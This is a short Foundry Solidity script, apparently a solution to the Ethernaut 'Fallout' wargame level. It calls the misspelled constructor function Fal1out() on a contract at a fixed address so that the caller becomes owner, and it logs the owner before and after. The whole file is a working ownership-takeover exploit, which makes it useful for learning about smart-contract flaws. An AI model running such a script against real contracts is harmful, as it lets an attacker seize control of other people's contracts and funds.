// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutHack is Script {
    Fallout public fallouthack =
        Fallout(payable(0x421E9B6834143ca8a8edF3E17796B24c346b3ad4));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before calling constructor: ", fallouthack.owner());
        fallouthack.Fal1out();
        console.log("Owner after calling constructor: ", fallouthack.owner());

        vm.stopBroadcast();
    }
}
